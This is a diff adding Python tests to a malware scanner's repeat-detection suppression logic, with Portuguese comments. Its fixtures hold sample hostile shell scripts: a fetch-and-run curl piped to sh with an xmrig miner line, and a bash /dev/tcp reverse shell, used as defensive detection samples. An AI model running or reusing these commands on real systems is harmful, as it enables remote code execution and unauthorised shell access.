@@ -943,3 +943,126 @@ class TestFifoNoHang:
         with patch.object(Path, "is_file", lambda self: True):
             out = _no_hang(engine.scan_file, fifo)
         assert out["ret"].verdict in (ScanVerdict.ERROR, ScanVerdict.SKIPPED), out
+
+
+# ---------------------------------------------------------------------------
+# Detecção repetida (2026-11-19): escrever 1 arquivo gerava CREATED + CLOSED,
+# 2 scans e 4 linhas no banco (threat.detected + scan.match, 2x). Visto na
+# VPS em 2026-11-18. Conteúdo de teste é só TEXTO, nunca executado.
+# ---------------------------------------------------------------------------
+
+_MINER = b"#!/bin/sh\ncurl -s http://127.0.0.1:9/x | sh\n./xmrig --donate-level 1 -o pool.invalid:3333\n"
+_RSHELL = b"#!/bin/bash\nbash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n"
+
+
+class TestRepeatSuppression:
+
+    def _engine(self, cfg: ConfigManager, sig_db: SignatureDB, window=None, quar=None):
+        from ekprotection.heuristics.engine import HeuristicEngine
+        if window is not None:
+            cfg.set("scanner.repeat_suppress_seconds", window)
+        log = MagicMock()
+        events: list[tuple[str, str]] = []
+
+        def get_source(name):
+            src = MagicMock()
+            src.event.side_effect = lambda et, msg, **kw: events.append((name, str(et)))
+            return src
+
+        log.get_source.side_effect = get_source
+        heur = HeuristicEngine(cfg, log_manager=log)
+        eng = ScanEngine(cfg, sig_db=sig_db, log_manager=log, heuristic_engine=heur,
+                         quar_manager=quar)
+        return eng, events
+
+    def test_same_content_twice_logged_once(self, cfg, sig_db, tmp_path) -> None:
+        eng, ev = self._engine(cfg, sig_db)
+        f = tmp_path / "miner.sh"
+        f.write_bytes(_MINER)
+        r1 = eng.scan_file(f)
+        r2 = eng.scan_file(f)
+        assert r1.is_threat and r2.is_threat       # o scan continua rodando
+        assert sorted(s for s, _ in ev) == ["heuristics", "scanner"]
+        assert eng.suppressed_repeats == 1
+
+    def test_changed_content_logged_again(self, cfg, sig_db, tmp_path) -> None:
+        """Evasão: trocar o conteúdo (mesmo path) tem que gravar de novo."""
+        eng, ev = self._engine(cfg, sig_db)
+        f = tmp_path / "x.sh"
+        f.write_bytes(_MINER)
+        eng.scan_file(f)
+        f.write_bytes(_RSHELL)
+        eng.scan_file(f)
+        assert [s for s, _ in ev].count("scanner") == 2
+        assert [s for s, _ in ev].count("heuristics") == 2
+
+    def test_clean_then_malicious_logged(self, cfg, sig_db, tmp_path) -> None:
+        eng, ev = self._engine(cfg, sig_db)
+        f = tmp_path / "y.sh"
+        f.write_bytes(b"#!/bin/sh\necho oi\n")
+        eng.scan_file(f)
+        n = len(ev)
+        f.write_bytes(_RSHELL)
+        assert eng.scan_file(f).is_threat
+        assert [s for s, _ in ev[n:]].count("scanner") == 1
+
+    def test_same_content_other_path_logged(self, cfg, sig_db, tmp_path) -> None:
+        eng, ev = self._engine(cfg, sig_db)
+        a, b = tmp_path / "a.sh", tmp_path / "b.sh"
+        a.write_bytes(_MINER); b.write_bytes(_MINER)
+        eng.scan_file(a); eng.scan_file(b)
+        assert [s for s, _ in ev].count("scanner") == 2
+
+    def test_window_expired_logged_again(self, cfg, sig_db, tmp_path) -> None:
+        eng, ev = self._engine(cfg, sig_db, window=60)
+        f = tmp_path / "m.sh"
+        f.write_bytes(_MINER)
+        with patch("ekprotection.scanner.engine.time.monotonic", return_value=1000.0):
+            eng.scan_file(f)
+        with patch("ekprotection.scanner.engine.time.monotonic", return_value=1061.0):
+            eng.scan_file(f)
+        assert [s for s, _ in ev].count("scanner") == 2
+
+    def test_window_zero_disables(self, cfg, sig_db, tmp_path) -> None:
+        eng, ev = self._engine(cfg, sig_db, window=0)
+        f = tmp_path / "m.sh"
+        f.write_bytes(_MINER)
+        eng.scan_file(f); eng.scan_file(f)
+        assert [s for s, _ in ev].count("scanner") == 2
+
+    def test_bad_window_value_falls_back(self, cfg, sig_db, tmp_path) -> None:
+        eng, _ = self._engine(cfg, sig_db, window="abc")
+        assert eng._repeat_window == 60.0
+
+    def test_quarantine_still_runs_on_repeat(self, cfg, sig_db, tmp_path) -> None:
+        """Só a gravação é pulada; a auto-quarentena roda nos dois scans."""
+        cfg.set("quarantine.auto_quarantine_critical", True)
+        quar = MagicMock()
+        eng, ev = self._engine(cfg, sig_db, quar=quar)
+        f = tmp_path / "r.sh"
+        f.write_bytes(_RSHELL)
+        assert eng.scan_file(f).is_critical
+        eng.scan_file(f)
+        assert quar.quarantine_file.call_count == 2
+        assert [s for s, _ in ev].count("scanner") == 1
+
+    def test_recent_cache_bounded(self, cfg, sig_db, tmp_path) -> None:
+        eng, _ = self._engine(cfg, sig_db)
+        eng._RECENT_MAX = 8
+        for i in range(20):
+            f = tmp_path / f"f{i}.sh"
+            f.write_bytes(_MINER)
+            eng.scan_file(f)
+        assert len(eng._recent_reports) <= 8
+
+    def test_heuristic_analyze_default_still_logs(self, cfg, tmp_path) -> None:
+        """Quem chama a heurística direto (sem scanner) continua gravando."""
+        from ekprotection.heuristics.engine import HeuristicEngine
+        log = MagicMock()
+        heur = HeuristicEngine(cfg, log_manager=log)
+        f = tmp_path / "h.sh"
+        f.write_bytes(_RSHELL)
+        heur.analyze(f)
+        assert log.get_source.return_value.event.call_count == 1
+        heur.analyze(f, log=False)
+        assert log.get_source.return_value.event.call_count == 1
